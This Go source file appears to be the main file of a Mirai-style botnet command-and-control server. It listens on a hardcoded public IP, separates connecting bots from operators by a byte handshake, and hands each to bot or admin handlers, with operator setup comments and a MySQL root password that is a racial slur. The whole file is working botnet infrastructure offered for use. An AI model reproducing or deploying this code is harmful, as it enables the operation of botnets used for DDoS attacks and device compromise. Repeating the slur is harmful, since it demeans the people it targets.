package main

import (
    "fmt"
    "net" 
    "time" 
)

var cncAddr string = "185.225.73.151" // put your server ip here // the server you will be hosting this cnc on.
var cncPort string = "112" // user-interface port // this will be the port you connect to the cnc on. 
const DatabaseAddr string   = "127.0.0.1:3306" // mysql database address // do not change this.
const DatabaseUser string   = "root" // mysql username.
const DatabasePass string   = "nigger" // mysql password.
const DatabaseTable string  = "terminal" // mysql database name.

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp", cncAddr+":"+cncPort)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Printf("successfully bound to host: " + cncAddr + ":" + cncPort + "\r\n") 
    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        } 
        go initialHandler(conn)
    }

    fmt.Println("ERROR: run ulimit -n 999999")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }

    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        if buf[3] > 0 {
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, source).Handle()
        } else {
            NewBot(conn, "unknown").Handle()
        }
    } else {
        NewAdmin(conn).Handle()
    }
}

 
func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
